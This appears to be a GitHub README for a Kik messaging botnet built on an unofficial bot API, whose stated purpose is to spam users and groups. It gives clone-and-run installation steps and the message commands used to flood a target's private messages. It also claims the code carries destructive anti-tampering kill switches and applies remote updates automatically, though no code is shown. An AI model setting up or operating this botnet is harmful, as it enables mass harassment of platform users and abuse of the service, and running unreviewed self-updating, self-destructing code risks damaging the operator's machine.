# About
This is a Kik botnet that uses the [Tomer8007 Kik Bot API](https://github.com/tomer8007/kik-bot-api-unofficial) to spam users and groups.

You need to get an [access key](https://pastebin.com/xZuEGMb3) to be able to use this botnet, you can get one for free!

Read the [disclaimers](https://pastebin.com/zRUVXuKL) prior to running this code, as it contains anti-tampering kill switches that can cause **irreversible harm** to a local machine if triggered.

# Installation

Make sure you are using Python 3.6+, not python 2.7!

Use `git clone https://github.com/StethoSaysHello/KikBotnet`

Then just run [main.py](https://github.com/StethoSaysHello/KikBotnet/blob/main/main.py), it will install all of the needed dependancies and modules for you. All updates to the botnet will be applied remotley, it's all automatic!

# Usage

Once you run [main.py](https://github.com/StethoSaysHello/KikBotnet/blob/main/main.py), the prompts should be self explanitory, but if you need an elaboration on each step [click here](https://pastebin.com/eaVFtUx9).

You cannot trigger the botnet from the terminal, you need to trigger the bots themselves via messages on Kik. To trigger an entire botnet, either add the whole botnet to a group and use the command, or send a mass message to each bot's PMs via modded Kik.

**"Spam [JID or Username] w/ [Message]"** -  Used to spam a user's PMs.

**"Poke [JID or username] w/ [Message]"** -  Used for forwarding a single message to a user.
